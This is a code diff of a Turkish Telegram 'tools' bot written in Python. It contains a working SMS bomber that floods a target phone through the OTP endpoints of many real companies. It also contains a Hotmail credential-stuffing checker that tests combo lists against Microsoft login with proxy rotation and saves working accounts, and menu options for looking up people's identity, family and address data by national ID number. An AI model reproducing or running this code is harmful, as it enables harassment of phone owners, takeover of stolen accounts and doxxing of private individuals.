+        "adres": "🏠 Adres Sorgu (Tapu & Adres)\nTC Kimlik Numarası girin (11 haneli):",
     },
     "en": {
         "tc": "🆔 Enter TC ID number (11 digits):",
@@ -1582,6 +1607,7 @@ TURKEY_PROMPTS = {
         "eokul": "🎓 Enter TC ID number (11 digits):",
         "tapu": "🏠 Enter TC ID number (11 digits):",
         "adaparsel": "🗺️ Enter Province,District (e.g., ISTANBUL,KADIKOY):",
+        "adres": "🏠 Address Query\nEnter TC ID number (11 digits):",
     },
     "ar": {
         "tc": "🆔 أدخل رقم الهوية (11 رقم):",
@@ -1595,18 +1621,17 @@ TURKEY_PROMPTS = {
         "eokul": "🎓 أدخل رقم الهوية (11 رقم):",
         "tapu": "🏠 أدخل رقم الهوية (11 رقم):",
         "adaparsel": "🗺️ أدخل المحافظة,المنطقة:",
+        "adres": "🏠 استعلام العنوان\nأدخل رقم الهوية (11 رقم):",
     },
 }
 
-
 def tools_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=2)
-
     if is_premium_osint(user_id):
         ls_txt = "🌍 LeakSights OSINT ⭐"
     else:
         ls_txt = "🌍 LeakSights OSINT 🔒"
-
+        
     mk.add(_btn("🇹🇷 Türkiye Sorguları", "menu_turkey"), _btn(ls_txt, "menu_ls"))
     mk.add(
         _btn("🎮 MC Bedrock", "tool_bedrock"), _btn("💳 CC Generator", "tool_ccgen"),
@@ -1615,7 +1640,7 @@ def tools_kb(user_id):
         _btn("🔎 DNS Sorgu", "tool_dns"), _btn("⚽ Bahis Sorgu", "tool_bahis"),
         _btn("🚗 Plaka Sorgu", "tool_plaka"), _btn("💎 PreDunyam", "tool_predunyam"),
         _btn("🛡️ Proxy Check", "tool_proxycheck"), _btn("🔍 URL Scan", "tool_urlscan"),
-        _btn("🎥 Video İndir", "tool_video"), _btn("🎵 Müzik İndir (MP3)", "tool_music"),
+        _btn("🎥 Video İndir", "tool_video"), _btn("🎵 Müzik İndir", "tool_music"),
         _btn("🤖 Bot Ekle", "tool_addbot"), _btn("🐍 PHP→Python", "tool_php2py"),
         _btn("💣 SMS Bomber", "tool_smsbomb"), _btn("📧 Hotmail Checker", "tool_hotmail"),
         _btn("📸 EXIF Metadata", "tool_exif"),
@@ -1623,31 +1648,33 @@ def tools_kb(user_id):
     mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
     return mk
 
-
 def turkey_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=2)
-
     def lbl(key):
         return TURKIYE_API[key].get(lang(user_id), TURKIYE_API[key]["tr"])
-
+        
     mk.add(_sep("👤 KİMLİK"))
     mk.add(_btn(f"{TURKIYE_API['tc']['icon']} {lbl('tc')}", "tr_tc"),
            _btn(f"{TURKIYE_API['tcpro']['icon']} {lbl('tcpro')}", "tr_tcpro"))
     mk.add(_btn(f"{TURKIYE_API['adsoyad']['icon']} {lbl('adsoyad')}", "tr_adsoyad"))
+    
     mk.add(_sep("👨‍👩‍👧 AİLE"))
     mk.add(_btn(f"{TURKIYE_API['aile']['icon']} {lbl('aile')}", "tr_aile"),
            _btn(f"{TURKIYE_API['ailepro']['icon']} {lbl('ailepro')}", "tr_ailepro"))
     mk.add(_btn(f"{TURKIYE_API['sulale']['icon']} {lbl('sulale')}", "tr_sulale"))
+    
     mk.add(_sep("📱 İLETİŞİM"))
     mk.add(_btn(f"{TURKIYE_API['tcgsm']['icon']} {lbl('tcgsm')}", "tr_tcgsm"),
            _btn(f"{TURKIYE_API['gsmtc']['icon']} {lbl('gsmtc')}", "tr_gsmtc"))
+           
     mk.add(_sep("🏠 MÜLK / EĞİTİM"))
     mk.add(_btn(f"{TURKIYE_API['tapu']['icon']} {lbl('tapu')}", "tr_tapu"),
            _btn(f"{TURKIYE_API['eokul']['icon']} {lbl('eokul')}", "tr_eokul"))
     mk.add(_btn(f"{TURKIYE_API['adaparsel']['icon']} {lbl('adaparsel')}", "tr_adaparsel"))
+    mk.add(_btn(f"{TURKIYE_API['adres']['icon']} {lbl('adres')}", "tr_adres"))
+    
     mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
     return mk
-
 
 def ls_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=2)
@@ -1655,11 +1682,13 @@ def ls_kb(user_id):
         mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
         mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
         return mk
+        
     cat_order = ["username", "name", "contact", "ip", "domain", "url", "identity", "other"]
     groups = {c: [] for c in cat_order}
     for key, info in LEAKSIGHTS_API.items():
         cat = info.get("cat", "other")
         groups.setdefault(cat, []).append((key, info))
+        
     l = lang(user_id)
     for cat in cat_order:
         items = groups.get(cat, [])
@@ -1669,9 +1698,9 @@ def ls_kb(user_id):
         for key, info in items:
             label = f"{info['icon']} {info.get(l, info.get('tr', key))}"
             mk.add(_btn(label, f"ls_{key}"))
+            
     mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
     return mk
-
 
 def premium_kb(user_id):
     mk = InlineKeyboardMarkup(row_width=1)
@@ -1680,18 +1709,14 @@ def premium_kb(user_id):
     mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
     return mk
 
-
 # ══════════════════════════════════════════════════════════════
 #  MULTI-BOT MANAGEMENT
 # ══════════════════════════════════════════════════════════════
-
 _CHILD_PROCS: dict = {}
 _PROC_LOCK = threading.Lock()
 
-
 def _get_python_exe():
     return sys.executable
-
 
 def _load_registry():
     if not os.path.exists(BOT_REGISTRY_FILE):
@@ -1702,73 +1727,64 @@ def _load_registry():
     except:
         return {}
 
-
 def _save_registry(registry: dict):
     with open(BOT_REGISTRY_FILE, "w", encoding="utf-8") as f:
         json.dump(registry, f, indent=2)
-
 
 def _spawn_bot(token: str, owner_id: int = None) -> bool:
     if token == BOT_TOKEN:
         print(f"[SPAWN] ⚠️ Ana bot token'ı spawn edilemez!")
         return False
-
     with _PROC_LOCK:
         if token in _CHILD_PROCS:
             proc = _CHILD_PROCS[token]
             if proc.poll() is None:
                 return False
-    script_path = os.path.abspath(__file__)
-    python_exe = _get_python_exe()
-    args = [python_exe, script_path, "--bot", token, "--owner", str(owner_id)]
-    try:
-        proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                                stdin=subprocess.DEVNULL,
-                                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
-                                start_new_session=True)
-        with _PROC_LOCK:
-            _CHILD_PROCS[token] = proc
-        registry = _load_registry()
-        registry[token] = {"owner_id": owner_id, "pid": proc.pid, "added": datetime.now().isoformat()}
-        _save_registry(registry)
-        return True
-    except Exception as e:
-        print(f"[ERROR] Failed to spawn bot: {e}")
-        return False
-
+                
+        script_path = os.path.abspath(__file__)
+        python_exe = _get_python_exe()
+        args = [python_exe, script_path, "--bot", token, "--owner", str(owner_id)]
+        try:
+            proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                                    stdin=subprocess.DEVNULL,
+                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
+                                    start_new_session=True)
+            with _PROC_LOCK:
+                _CHILD_PROCS[token] = proc
+            registry = _load_registry()
+            registry[token] = {"owner_id": owner_id, "pid": proc.pid, "added": datetime.now().isoformat()}
+            _save_registry(registry)
+            return True
+        except Exception as e:
+            print(f"[ERROR] Failed to spawn bot: {e}")
+            return False
 
 def start_saved_bots():
     registry = _load_registry()
     if not registry:
         return
-
     if BOT_TOKEN in registry:
         print(f"[MAIN] ⚠️ Ana bot token'ı registry'de bulundu, atlanıyor...")
         del registry[BOT_TOKEN]
         _save_registry(registry)
-
     if not registry:
         print("[MAIN] Başlatılacak kayıtlı bot yok.")
         return
-
+        
     print(f"[MAIN] Starting {len(registry)} saved bots...")
     for token, info in registry.items():
         owner_id = info.get("owner_id")
         print(f"[MAIN] Starting bot: {token[:15]}...")
         _spawn_bot(token, owner_id)
 
-
 # ══════════════════════════════════════════════════════════════
 #  SMS BOMBER
 # ══════════════════════════════════════════════════════════════
-
 _SMS_SESSIONS: dict = {}
 _SMS_LOCK = threading.Lock()
 
-
 class SendSms:
     adet = 0
-
     def __init__(self, phone, mail):
         rakam = []
         tcNo = ""
@@ -1776,7 +1792,7 @@ class SendSms:
         for i in range(1, 9):
             rakam.append(randint(0, 9))
         rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (
-                    rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
+                rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
         rakam.append((sum(rakam[:10])) % 10)
         for r in rakam:
             tcNo += str(r)
@@ -2250,9 +2266,16 @@ class SendSms:
     def Kigili(self):
         try:
             url = "https://www.kigili.com/users/registration/"
-            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail,
-                    "phone": "0" + self.phone, "password": "nwejkfıower32",
-                    "confirm": "true", "kvkk": "true", "next": ""}
+            data = {
+                "first_name": "Memati",
+                "last_name": "Bas",
+                "email": self.mail,
+                "phone": "0" + self.phone,
+                "password": "nwejkfıower32",
+                "confirm": "true",
+                "kvkk": "true",
+                "next": ""
+            }
             r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
             if r.status_code == 202:
                 self.adet += 1
@@ -2262,7 +2285,7 @@ class SendSms:
     def Bim(self):
         try:
             r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",
-                             json={"phone": self.phone}, timeout=6)
+                              json={"phone": self.phone}, timeout=6)
             if r.status_code == 200:
                 self.adet += 1
         except:
@@ -2512,7 +2535,7 @@ class SendSms:
     def TiklaGelsin(self):
         try:
             url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
-            query = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": "+90" + self.phone}}
+            query = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\ngenerateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": "+90" + self.phone}}
             r = requests.post(url, json=query, timeout=6)
             if r.json().get("data", {}).get("generateOtp") == True:
                 self.adet += 1
@@ -2684,7 +2707,7 @@ class SendSms:
     def Pidem(self):
         try:
             url = "https://restashop.azurewebsites.net:443/graphql/"
-            query = {"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
+            query = {"query": "\nmutation ($phone: String) {\nsendOtpSms(phone: $phone) {\nresultStatus\nmessage\n}\n}\n", "variables": {"phone": self.phone}}
             r = requests.post(url, json=query, timeout=6)
             if r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS":
                 self.adet += 1
@@ -2825,17 +2848,14 @@ class SendSms:
         except:
             pass
 
-
 def _get_sms_services():
     return [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__') and attr != 'adet']
-
 
 def _sms_worker(phone: str, mail: str, mode: str, limit, interval: float,
                 stop_event: threading.Event, uid: int, bot_instance):
     sms = SendSms(phone, mail)
     services = _get_sms_services()
     count = 0
-
     try:
         if mode == "turbo":
             while not stop_event.is_set():
@@ -2849,18 +2869,15 @@ def _sms_worker(phone: str, mail: str, mode: str, limit, interval: float,
                         t.start()
                     except:
                         pass
-
                 for t in threads:
                     try:
                         t.join(timeout=5)
                     except:
                         pass
-
                 count += len(services)
                 with _SMS_LOCK:
                     if uid in _SMS_SESSIONS:
                         _SMS_SESSIONS[uid]["count"] = count
-
         else:
             while not stop_event.is_set():
                 for fn_name in services:
@@ -2877,10 +2894,8 @@ def _sms_worker(phone: str, mail: str, mode: str, limit, interval: float,
                                 _SMS_SESSIONS[uid]["count"] = count
                     except:
                         pass
-
-                    if interval > 0:
-                        stop_event.wait(interval)
-
+                if interval > 0:
+                    stop_event.wait(interval)
     except Exception as e:
         print(f"[SMS WORKER] Error: {e}")
     finally:
@@ -2889,37 +2904,35 @@ def _sms_worker(phone: str, mail: str, mode: str, limit, interval: float,
                 _SMS_SESSIONS[uid]["running"] = False
                 _SMS_SESSIONS[uid]["count"] = count
 
-
 def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
     with _SMS_LOCK:
         if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
             bot_instance.send_message(uid, "⚠️ Zaten aktif bir SMS bombardımanı var!\n/smsstop ile durdurun.")
             return
-
+            
     stop_event = threading.Event()
     services = _get_sms_services()
     mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
     limit_txt = str(limit) if limit else "Sonsuz ♾️"
     interval_txt = f"{interval}s" if mode == "normal" else "Maksimum Hız"
-
+    
     bot_instance.send_message(
         uid,
-        f"💣 <b>SMS Bomber Başladı!</b>\n\n"
+        f"💣 <b>SMS Bomber Başladı!</b>\n"
         f"📱 Hedef: <code>{phone}</code>\n"
         f"📊 Servis: <b>{len(services)}</b> API\n"
         f"⚙️ Mod: <b>{mode_txt}</b>\n"
         f"🔢 Limit: <b>{limit_txt}</b>\n"
-        f"⏱ Aralık: <b>{interval_txt}</b>\n\n"
+        f"⏱ Aralık: <b>{interval_txt}</b>\n"
         f"🛑 Durdurmak için: /smsstop\n"
         f"📊 Durum için: /smsstatus"
     )
-
+    
     t = threading.Thread(
         target=_sms_worker,
         args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance),
         daemon=True
     )
-
     with _SMS_LOCK:
         _SMS_SESSIONS[uid] = {
             "running": True,
@@ -2933,16 +2946,14 @@ def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
         }
     t.start()
 
-
 def _sms_step1_number(msg, bot_instance):
     uid = msg.from_user.id
     phone = msg.text.strip()
     if not (phone.isdigit() and len(phone) == 10):
         bot_instance.reply_to(msg, "❌ Geçersiz numara! 10 haneli olmalı (başında 0 olmadan).\nÖrnek: 5306524123")
         return
-    m = bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n\n📧 Mail adresi girin (bilmiyorsanız - gönderin):")
+    m = bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n📧 Mail adresi girin (bilmiyorsanız - gönderin):")
     bot_instance.register_next_step_handler(m, lambda m: _sms_step2_mail(m, phone, bot_instance))
-
 
 def _sms_step2_mail(msg, phone, bot_instance):
     uid = msg.from_user.id
@@ -2951,12 +2962,13 @@ def _sms_step2_mail(msg, phone, bot_instance):
         mail = ""
     if mail and ("@" not in mail or "." not in mail):
         mail = ""
+        
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(InlineKeyboardButton("⚡ Normal Mod", callback_data=f"sms_normal_{phone}_{mail}"),
            InlineKeyboardButton("🚀 Turbo Mod", callback_data=f"sms_turbo_{phone}_{mail}"))
-    bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n📧 Mail: <code>{mail or 'Rastgele'}</code>\n\n⚙️ <b>Mod seçin:</b>",
+           
+    bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n📧 Mail: <code>{mail or 'Rastgele'}</code>\n⚙️ <b>Mod seçin:</b>",
                           reply_markup=mk)
-
 
 def _sms_normal_settings(msg, phone, mail, bot_instance):
     uid = msg.from_user.id
@@ -2967,19 +2979,17 @@ def _sms_normal_settings(msg, phone, mail, bot_instance):
     except:
         limit = 0
         interval = 0
-
+        
     if limit < 0:
         limit = 0
     if interval < 0:
         interval = 0
-
+        
     _launch_sms_bomb(uid, phone, mail, "normal", limit, interval, bot_instance)
-
 
 # ══════════════════════════════════════════════════════════════
 #  HOTMAIL CHECKER v4.0
 # ══════════════════════════════════════════════════════════════
-
 HOTMAIL_QUEUE = queue.Queue()
 HOTMAIL_CURRENT_TASK: Optional[dict] = None
 HOTMAIL_QUEUE_LOCK = threading.Lock()
@@ -2996,7 +3006,6 @@ HOTMAIL_LOCK = threading.Lock()
 HOTMAIL_KEYWORD_HITS = {}
 HOTMAIL_COUNTRY_HITS = {}
 HOTMAIL_START_TIME = None
-
 PROXY_LIST = []
 PROXY_INDEX = 0
 PROXY_LOCK = threading.Lock()
@@ -3008,10 +3017,8 @@ COUNTRY_CODES = {
     "KR": "🇰🇷", "IN": "🇮🇳", "AU": "🇦🇺", "CA": "🇨🇦", "ZA": "🇿🇦",
 }
 
-
 def get_country_flag(country_code):
     return COUNTRY_CODES.get(country_code.upper(), f"🌍 {country_code.upper()}")
-
 
 def get_next_proxy():
     global PROXY_INDEX
@@ -3021,7 +3028,6 @@ def get_next_proxy():
         proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
         PROXY_INDEX += 1
         return proxy
-
 
 def _get_login_session(proxy=None):
     session = requests.Session()
@@ -3043,7 +3049,6 @@ def _get_login_session(proxy=None):
         session.proxies = {"http": proxy, "https": proxy}
     return session
 
-
 def _extract_login_params(session, email):
     try:
         url = "https://login.live.com/oauth20_authorize.srf"
@@ -3057,21 +3062,15 @@ def _extract_login_params(session, email):
         }
         resp = session.get(url, params=params, timeout=15, allow_redirects=True)
         text = resp.text
-
         ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
         ppft = ppft_match.group(1) if ppft_match else None
-
         url_post_match = re.search(r'urlPost:[\'"]?([^\'",}]+)', text)
         url_post = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"
-
         flow_token_match = re.search(r'"sFT":"([^"]+)"', text)
         flow_token = flow_token_match.group(1) if flow_token_match else ppft
-
         sctx_match = re.search(r'"sCtx":"([^"]+)"', text)
         sctx = sctx_match.group(1) if sctx_match else ""
-
         cookies = session.cookies.get_dict()
-
         return {
             "success": True,
             "ppft": flow_token or ppft,
@@ -3083,7 +3082,6 @@ def _extract_login_params(session, email):
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-
 def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
     for attempt in range(max_retries):
         session = _get_login_session(proxy)
@@ -3094,11 +3092,11 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                     time.sleep(1)
                     continue
                 return {"status": "error", "detail": params.get("error", "Param extraction failed")}
-
+                
             ppft = params["ppft"]
             url_post = params["url_post"]
             cookies = params["cookies"]
-
+            
             login_data = {
                 "login": email,
                 "loginfmt": email,
@@ -3118,25 +3116,21 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                 "isRecoveryAttemptPost": "0",
                 "i19": "0",
             }
-
             cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
-
             headers = {
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Origin": "https://login.live.com",
                 "Referer": "https://login.live.com/",
                 "Cookie": cookie_str,
             }
-
+            
             resp = session.post(url_post, data=login_data, headers=headers,
                                 timeout=20, allow_redirects=False)
-
             text = resp.text
             headers_resp = resp.headers
             status_code = resp.status_code
-
             location = headers_resp.get('Location', '')
-
+            
             if 'code=' in location or 'access_token' in location:
                 token_info = _get_access_token_from_redirect(session, location)
                 account_info = _get_account_info(token_info.get("token")) if token_info.get("token") else {}
@@ -3148,7 +3142,7 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                     "country": account_info.get("country", "Bilinmiyor"),
                     "detail": "Login successful"
                 }
-
+                
             if any(x in text.lower() for x in [
                 "two-step", "2fa", "authenticator", "security code",
                 "verify your identity", "additional security", "microsoft authenticator",
@@ -3160,7 +3154,7 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                     "password": password,
                     "detail": "2FA enabled"
                 }
-
+                
             if any(x in text.lower() for x in [
                 "incorrect password", "wrong password", "doesn't exist",
                 "account doesn't exist", "invalid password", "sign in error",
@@ -3173,7 +3167,7 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                     "password": password,
                     "detail": "Invalid credentials"
                 }
-
+                
             if any(x in text.lower() for x in [
                 "captcha", "recaptcha", "challenge", "verify you're human",
                 "i'm not a robot", "g-recaptcha"
@@ -3184,7 +3178,7 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                     "password": password,
                     "detail": "Captcha required"
                 }
-
+                
             if any(x in text.lower() for x in [
                 "locked", "suspended", "blocked", "temporarily locked",
                 "unusual activity", "security alert", "account restricted"
@@ -3195,7 +3189,7 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                     "password": password,
                     "detail": "Account locked/suspended"
                 }
-
+                
             return {
                 "status": "error",
                 "email": email,
@@ -3203,7 +3197,7 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
                 "detail": f"Unknown response (status={status_code})",
                 "sample": text[:200]
             }
-
+            
         except requests.exceptions.ProxyError as e:
             if attempt < max_retries - 1:
                 time.sleep(1)
@@ -3221,7 +3215,6 @@ def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
             return {"status": "error", "detail": str(e)}
         finally:
             session.close()
-
 
 def _get_access_token_from_redirect(session, location):
     try:
@@ -3242,10 +3235,9 @@ def _get_access_token_from_redirect(session, location):
                     "refresh_token": json_data.get("refresh_token"),
                     "success": True
                 }
-        return {"success": False}
+            return {"success": False}
     except:
         return {"success": False}
-
 
 def _get_account_info(access_token):
     if not access_token:
@@ -3266,7 +3258,6 @@ def _get_account_info(access_token):
     except:
         return {}
 
-
 @dataclass
 class HotmailTask:
     user_id: int
@@ -3286,128 +3277,110 @@ class HotmailTask:
         if not self.keywords:
             self.keywords = get_user_keywords(self.user_id)
 
-
 def hotmail_worker(combo_line, user_id, user_name, is_premium, keywords):
     global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS, HOTMAIL_PROCESSED
     global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS
-
     try:
         if ":" not in combo_line:
             with HOTMAIL_LOCK:
                 HOTMAIL_BAD += 1
                 HOTMAIL_PROCESSED += 1
             return
-
+            
         email, password = combo_line.split(":", 1)
         email = email.strip()
         password = password.strip()
-
         if not email or not password:
             with HOTMAIL_LOCK:
                 HOTMAIL_BAD += 1
                 HOTMAIL_PROCESSED += 1
             return
-
+            
         time.sleep(0.1)
-
         proxy = get_next_proxy()
         result = _check_hotmail_oauth(email, password, proxy=proxy, max_retries=3)
         status = result["status"]
-
+        
         with HOTMAIL_LOCK:
             HOTMAIL_PROCESSED += 1
-
             if status == "hit":
                 HOTMAIL_HIT += 1
                 save_hotmail_log(user_id, user_name, email, password, "HIT", result.get("detail", ""))
-
                 name = result.get("name", "Bilinmiyor")
                 country = result.get("country", "Bilinmiyor")
-
                 email_lower = email.lower()
                 for kw in keywords:
                     if kw.lower() in email_lower:
                         HOTMAIL_KEYWORD_HITS[kw] = HOTMAIL_KEYWORD_HITS.get(kw, 0) + 1
                         break
-
                 if '.' in email:
                     domain = email.split('.')[-1].upper()
                     if len(domain) == 2:
                         HOTMAIL_COUNTRY_HITS[domain] = HOTMAIL_COUNTRY_HITS.get(domain, 0) + 1
-
                 if "rewards" in email_lower or "microsoft" in email_lower:
                     HOTMAIL_REWARDS += 1
-
+                    
                 hit_line = f"{email}:{password}"
                 if name != "Bilinmiyor":
                     hit_line += f" | Name: {name}"
                 if country != "Bilinmiyor":
                     hit_line += f" | Country: {country}"
-
+                    
                 with open(f"hits_{user_id}.txt", "a", encoding="utf-8") as f:
                     f.write(hit_line + "\n")
-
                 print(f"✅ HIT | {user_name} | {email}:{password} | {name} | {country}")
-
+                
             elif status == "2fa":
                 HOTMAIL_2FA += 1
                 save_hotmail_log(user_id, user_name, email, password, "2FA", result.get("detail", ""))
                 print(f"🔐 2FA | {user_name} | {email}")
-
             elif status == "captcha":
                 HOTMAIL_ERROR += 1
                 save_hotmail_log(user_id, user_name, email, password, "CAPTCHA", result.get("detail", ""))
                 print(f"🤖 CAPTCHA | {user_name} | {email}")
-
             elif status == "locked":
                 HOTMAIL_ERROR += 1
                 save_hotmail_log(user_id, user_name, email, password, "LOCKED", result.get("detail", ""))
                 print(f"🔒 LOCKED | {user_name} | {email}")
-
             elif status == "bad":
                 HOTMAIL_BAD += 1
                 save_hotmail_log(user_id, user_name, email, password, "BAD", result.get("detail", ""))
                 print(f"❌ BAD | {user_name} | {email}")
-
             else:
                 HOTMAIL_ERROR += 1
                 save_hotmail_log(user_id, user_name, email, password, "ERROR", result.get("detail", "Unknown"))
                 print(f"⚠️ ERROR | {user_name} | {email} | {result.get('detail', 'Unknown')}")
-
     except Exception as e:
         with HOTMAIL_LOCK:
             HOTMAIL_ERROR += 1
             HOTMAIL_PROCESSED += 1
         print(f"⚠️ WORKER ERROR | {user_name} | {e}")
 
-
 def hotmail_check(username, password):
     proxy = get_next_proxy()
     result = _check_hotmail_oauth(username, password, proxy=proxy, max_retries=3)
     return result["status"]
 
-
 def process_hotmail_queue():
     global HOTMAIL_CURRENT_TASK, HOTMAIL_QUEUE_RUNNING, main_bot
     global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS
     global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS, HOTMAIL_START_TIME
-
+    
     while HOTMAIL_QUEUE_RUNNING:
         try:
             try:
                 task = HOTMAIL_QUEUE.get(timeout=5)
             except queue.Empty:
                 continue
-
+                
             HOTMAIL_START_TIME = time.time()
             HOTMAIL_HIT = 0
             HOTMAIL_BAD = 0
             HOTMAIL_ERROR = 0
             HOTMAIL_2FA = 0
-            HOTMAIL_REWARDS = 0
             HOTMAIL_KEYWORD_HITS = {}
             HOTMAIL_COUNTRY_HITS = {}
-
+            
             with HOTMAIL_QUEUE_LOCK:
                 HOTMAIL_CURRENT_TASK = {
                     "user_id": task.user_id,
@@ -3418,24 +3391,24 @@ def process_hotmail_queue():
                     "status_msg_id": task.status_msg_id,
                     "keywords": task.keywords
                 }
-
+                
             print(f"\n🚀 HOTMAIL TARAMA BAŞLADI | {task.user_name} | {len(task.combo_list)} satır")
-
+            
             try:
                 if main_bot:
                     main_bot.edit_message_text(
-                        f"🚀 **Hotmail Checker Başladı!**\n\n"
+                        f"🚀 **Hotmail Checker Başladı!**\n"
                         f"👤 {task.user_name}\n"
                         f"📂 Toplam: {len(task.combo_list)} satır\n"
                         f"⚙️ Thread: {task.thread_count}\n"
                         f"{'⭐ Premium' if task.is_premium else '🆓 Free'}\n"
-                        f"📊 Sıradaki: {HOTMAIL_QUEUE.qsize()} kişi\n\n"
+                        f"📊 Sıradaki: {HOTMAIL_QUEUE.qsize()} kişi\n"
                         f"📌 İlerleme: 0/{len(task.combo_list)}",
                         task.chat_id, task.status_msg_id
                     )
             except:
                 pass
-
+                
             try:
                 with ThreadPoolExecutor(max_workers=task.thread_count) as executor:
                     futures = []
@@ -3444,30 +3417,29 @@ def process_hotmail_queue():
                             hotmail_worker, line, task.user_id, task.user_name,
                             task.is_premium, task.keywords
                         ))
-
+                        
                     processed = 0
                     total = len(task.combo_list)
-
                     for future in as_completed(futures):
                         processed += 1
                         try:
                             future.result()
                         except:
                             pass
-
+                            
                         if processed % 10 == 0 or processed == total:
                             try:
                                 if main_bot:
                                     elapsed = int(time.time() - HOTMAIL_START_TIME)
                                     cpm = int(processed / (elapsed / 60)) if elapsed > 0 else 0
                                     main_bot.edit_message_text(
-                                        f"🚀 **Hotmail Checker Çalışıyor**\n\n"
+                                        f"🚀 **Hotmail Checker Çalışıyor**\n"
                                         f"👤 {task.user_name}\n"
                                         f"📂 İlerleme: {processed}/{total} (%{int(processed/total*100)})\n"
                                         f"✅ Hit: {HOTMAIL_HIT} | ❌ Bad: {HOTMAIL_BAD}\n"
                                         f"🔐 2FA: {HOTMAIL_2FA} | ⚠️ Error: {HOTMAIL_ERROR}\n"
                                         f"⚙️ Thread: {task.thread_count} | ⚡️ CPM: {cpm}\n"
-                                        f"📊 Sıradaki: {HOTMAIL_QUEUE.qsize()} kişi\n\n"
+                                        f"📊 Sıradaki: {HOTMAIL_QUEUE.qsize()} kişi\n"
                                         f"{'⭐ Premium' if task.is_premium else '🆓 Free'}",
                                         task.chat_id, task.status_msg_id
                                     )
@@ -3475,10 +3447,10 @@ def process_hotmail_queue():
                                 pass
             except:
                 pass
-
+                
             elapsed = int(time.time() - HOTMAIL_START_TIME)
             total = HOTMAIL_HIT + HOTMAIL_BAD + HOTMAIL_ERROR + HOTMAIL_2FA
-
+            
             result_lines = [
                 "✅ **Tarama Tamamlandı!**",
                 "━━━━━━━━━━━━━━━━━━━━━",
@@ -3496,31 +3468,27 @@ def process_hotmail_queue():
                 "",
                 "🏷️ **KEYWORDS:**"
             ]
-
+            
             for kw, count in HOTMAIL_KEYWORD_HITS.items():
                 pct = int((count / HOTMAIL_HIT) * 100) if HOTMAIL_HIT > 0 else 0
                 result_lines.append(f"🎯 {kw}: {count} Hit (%{pct})")
-
             if not HOTMAIL_KEYWORD_HITS:
                 result_lines.append("   ❌ Keyword eşleşmesi yok")
-
+                
             result_lines.append("")
             result_lines.append("🌍 **COUNTRIES:**")
-
             sorted_countries = sorted(HOTMAIL_COUNTRY_HITS.items(), key=lambda x: x[1], reverse=True)[:10]
